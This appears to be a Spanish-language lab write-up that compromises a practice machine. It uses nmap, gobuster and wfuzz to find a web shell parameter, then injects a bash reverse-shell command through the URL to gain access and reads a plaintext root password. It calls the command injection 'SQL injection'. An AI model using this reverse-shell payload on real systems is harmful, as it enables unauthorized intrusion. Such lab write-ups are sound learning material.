
---
>Lo primero es hacer un escaneo de puertos y servicios con nmap.
![[Pasted image 20240710133744.png]]
>Accedo al servicio http y lo que encuentro es una web donde aparentemente no encuentro nada útil.
![[Pasted image 20240710133806.png]]
>Al final de la página, encuentro el apartado de contacto donde dice que en el apartado /tmp de la máquina hay algo que puede ser interesante.
![[Pasted image 20240710134112.png]]
>Procedo a hacer un poco de fuzzing web con la herramienta gobuster para ver si puedo descubrir algunos directorios que a simple vista se encuentran ocultos.
![[Pasted image 20240710134958.png]]
>Encuentro el apartado warning.html y shell.php.
>Accedo a la dirección warning.html y encuentro el siguiente mensaje.
![[Pasted image 20240710140227.png]]
>Ahora decido acceder al apartado shel.php.
![[Pasted image 20240710134025.png]]
>Voy a suponer que el apartado shell.php actúa como una consola, por lo que posiblemente pueda inyectar código sql a través de la url.
>Para saber qué parámetro necesito para inyectar código, voy a hacer uso de la herramienta wfuzz de la siguiente manera.
![[Pasted image 20240710135815.png]]
>La herramienta me ha reportado que el parámetro que necesito es parameter.
>Lo primero que hago es ponerme en escucha por el puerto indicado para posteriormente recibir una reverse shell y ganar acceso al sistema.
![[Pasted image 20240710140152.png]]
>Ahora inyecto código a la url de manera que me proporcione una reverse shell a la ip y el puerto indicados.
``` sqli
http://172.17.0.2/shell.php?parameter=bash -c "bash -i >%26 /dev/tcp/172.17.0.2/4343 0>%261"
```
![[Pasted image 20240710140212.png]]
>Cuando ejecuto la inyección, gano acceso a un terminal.
>Soy el usuario www-data.
>Descubro un documento secreto.txt y listo su contenido, obteniendo una supuesta password contraseñaderoot123.
![[Pasted image 20240710140412.png]]
>Intento iniciar sesión como root introduciendo la posible password que he obtenido anteriormente.
![[Pasted image 20240710140523.png]]